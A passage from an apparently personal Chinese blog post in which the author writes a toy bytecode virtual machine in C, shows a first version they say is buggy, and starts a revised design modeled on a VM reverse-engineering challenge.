data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 定义虚拟机的内存大小</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MEM_SIZE</span> <span class=\"token expression\"><span class=\"token number\">512</span></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 定义虚拟机支持的指令集</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    HLT<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 停止执行</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    MOV<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 移动数据</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    ADD<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 加法运算</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    SUB<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 减法运算</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    JMP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 无条件跳转</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    JZ<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// 条件跳转（如果零标志为真）</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    JNZ<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 条件跳转（如果零标志为假）</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// 定义虚拟机支持的寄存器</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    R0 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    R1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    R2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    R3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    PC<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 程序计数器</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    SP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 栈指针</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    FLG<span class=\"token punctuation\">,</span><span class=\"token comment\">// 标志寄存器（用于保存比较结果）</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// 定义虚拟机结构体，包含内存、寄存器和运行状态等字段</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> mem<span class=\"token punctuation\">[</span>MEM_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 内存空间，每个单元 8 位（1 字节）</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token class-name\">uint16_t</span> reg<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 寄存器数组，每个寄存器 16 位（2 字节）</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">int</span> running<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 运行状态，0 表示停止，1 表示运行中</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span> VM<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">// 创建并初始化一个虚拟机实例，并返回指针</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>VM<span class=\"token operator\">*</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    VM<span class=\"token operator\">*</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 分配内存空间给虚拟机实例</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 将程序计数器置为 0（从内存地址 0 开始执行）</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> MEM_SIZE <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 将栈指针置为内存最高地址 - 2（栈从高地址向低地址增长）</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 将标志寄存器置为 0（无比较结果）</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 将运行状态置为 1（开始执行）</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>     <span class=\"token comment\">// 初始化其他寄存器为 0</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R1<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R3<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">// 加载一段程序到虚拟机的内存中，并返回加载后的程序长度（字节数）</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">,</span> <span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> prog<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// 初始化程序长度为 0</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>prog <span class=\"token operator\">!=</span> HLT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>              <span class=\"token comment\">// 循环读取程序字节，直到遇到 HLT 指令</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将当前字节写入虚拟机内存中，相对于程序计数器的偏移地址</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        prog<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// 指向下一个字节</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        len<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                          <span class=\"token comment\">// 程序长度加 1</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> HLT<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 将 HLT 指令写入虚拟机内存中，作为程序的结束标志</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">return</span> len <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                     <span class=\"token comment\">// 返回程序长度（包含 HLT 指令）</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"执行函数\"><a class=\"markdownIt-Anchor\" href=\"#执行函数\">#</a> 执行函数</h3>\n<p>本来想在 case 里面定义 dst src 缓存变量的，结果 vscode 一直报错 只好提前定义了</p>\n<pre><code>// 定义一个执行函数，接受一个虚拟机实例作为参数\nvoid vm_exec(VM* vm) &#123;\n    uint8_t dst;//焯了 本来想在case里面定义的\n    uint8_t src;\n    while (vm-&gt;running) &#123; // 循环执行，直到运行状态为0\n        uint8_t op = vm-&gt;mem[vm-&gt;reg[PC]]; // 从内存中读取当前指令\n        switch (op) &#123; // 根据指令类型进行分支处理\n            case HLT: // 停止执行\n                vm-&gt;running = 0; // 将运行状态置为0\n                break;\n            case MOV: // 移动数据\n                dst = vm-&gt;mem[vm-&gt;reg[PC] + 1]; // 读取目标寄存器编号（第一个操作数）\n                src = vm-&gt;mem[vm-&gt;reg[PC] + 2]; // 读取源寄存器编号（第二个操作数）\n                vm-&gt;reg[dst] = vm-&gt;reg[src]; // 将源寄存器的值赋给目标寄存器\n                vm-&gt;reg[PC] += 3; // 将程序计数器增加3（跳过指令和操作数）\n                break;\n            case ADD: // 加法运算\n                dst = vm-&gt;mem[vm-&gt;reg[PC] + 1]; // 读取目标寄存器编号（第一个操作数）\n                src = vm-&gt;mem[vm-&gt;reg[PC] + 2]; // 读取源寄存器编号（第二个操作数）\n                uint16_t res = vm-&gt;reg[dst] + vm-&gt;reg[src]; // 计算两个寄存器的值之和，并保存在16位变量中\n                if (res == 0) &#123; // 如果结果为0，则将零标志置为1，否则置为0\n                    vm-&gt;reg[FLG] = 1;\n                &#125; else &#123;\n                    vm-&gt;reg[FLG] = 0;\n                &#125;   \n            &#125;\n            break;\n        &#125;\n    &#125;\n</code></pre>\n<h3 id=\"测试用函数\"><a class=\"markdownIt-Anchor\" href=\"#测试用函数\">#</a> 测试用函数</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 一个测试函数，接受一个虚拟机实例作为参数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// 定义一段测试程序，包含以下指令：</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// MOV R0, 10   // 将 10 赋给寄存器 R0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// MOV R1, 20   // 将 20 赋给寄存器 R1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// ADD R2, R0   // 将寄存器 R0 和 R1 的值相加，并赋给寄存器 R2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// HLT          // 停止执行</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> prog<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>MOV<span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> MOV<span class=\"token punctuation\">,</span> R1<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> ADD<span class=\"token punctuation\">,</span> R2<span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> HLT<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">,</span> prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 加载测试程序到虚拟机内存中，并获取程序长度</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Loaded %d bytes of program.\\n\"</span><span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印程序长度</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 执行虚拟机</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Register values:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 打印寄存器的值</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"R%d: %d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution finished.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印执行结束</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>运行结果出错了我焯</p>\n<p><strong>mov 指令实现有问题</strong>:mov 指令分情况哇，一种是立即数赋给寄存器 一种是寄存器给寄存器</p>\n<p>然后虚拟机的初始化有问题 <strong>指令读取有问题</strong></p>\n<h3 id=\"改变思路解决问题\"><a class=\"markdownIt-Anchor\" href=\"#改变思路解决问题\">#</a> 改变思路解决问题</h3>\n<p><img data-src=\"/images/image-20230317205054119.png\" alt=\"image.png\"></p>\n<p>看之前做过的 vm 逆向题目 发现多了一个数来判断的 于是改变思路 模仿着这道题写虚拟机</p>\n<h3 id=\"完善后的代码\"><a class=\"markdownIt-Anchor\" href=\"#完善后的代码\">#</a> 完善后的代码</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 定义虚拟机的内存大小</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MEM_SIZE</span> <span class=\"token expression\"><span class=\"token number\">512</span></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 定义虚拟机支持的指令集</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    MOV<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 移动数据</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    PUSH<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    POP<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    ALU<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    CMP<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    JMP<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tJNE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tJE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    SUB<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    HLT<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// 定义虚拟机支持的寄存器</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    R0<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    R1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    R2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    R3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    R4<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    PC<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 程序计数器</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    SP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 栈指针</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    FLG<span class=\"token punctuation\">,</span><span class=\"token comment\">// 标志寄存器（用于保存比较结果）</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">// 定义虚拟机结构体，包含内存、寄存器和运行状态等字段</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> mem<span class=\"token punctuation\">[</span>MEM_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 内存空间，每个单元 8 位（1 字节）</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token class-name\">uint16_t</span> reg<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 寄存器数组，每个寄存器 16 位（2 字节）</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">int</span> running<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 运行状态，0 表示停止，1 表示运行中</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span> VM<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">// 创建并初始化一个虚拟机实例，并返回指针</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>VM<span class=\"token operator\">*</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    VM<span class=\"token operator\">*</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 分配内存空间给虚拟机实例</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 将程序计数器置为 0（从内存地址 0 开始执行）</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> MEM_SIZE <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 将栈指针置为内存最高地址 - 2（栈从高地址向低地址增长）</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 将标志寄存器置为 0（无比较结果）</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 将运行状态置为 1（开始执行）</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\">// 初始化其他寄存器为 0</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R1<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R3<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R4<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">// 加载一段程序到虚拟机的内存中，并返回加载后的程序长度（字节数）</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">,</span> <span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> prog<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// 初始化程序长度为 0</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>prog <span class=\"token operator\">!=</span> HLT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>              <span class=\"token comment\">// 循环读取程序字节，直到遇到 HLT 指令</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将当前字节写入虚拟机内存中，相对于程序计数器的偏移地址</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        prog<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// 指向下一个字节</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        len<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                          <span class=\"token comment\">// 程序长度加 